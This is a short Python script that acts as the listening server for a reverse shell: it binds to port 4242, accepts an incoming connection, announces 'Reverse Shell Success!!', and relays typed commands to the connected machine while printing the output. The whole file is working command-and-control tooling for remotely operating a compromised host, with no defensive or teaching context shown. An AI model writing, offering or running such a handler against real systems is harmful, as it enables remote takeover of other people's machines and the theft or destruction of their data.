import sys 
import socket 


s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4242))

s.listen(1)

while True:
    print(f'[+] Server is listening.....')

    client = s.accept()
    print(f'[+] Reverse Shell Success!! {client[1]}')

    client[0].send('connected'.encode())
    while True:
        cmd = input('command>>')
        client[0].send(cmd.encode())

        if cmd.lower() in ['exit']:
            break

        result = client[0].recv(1024).decode()
        print(result)

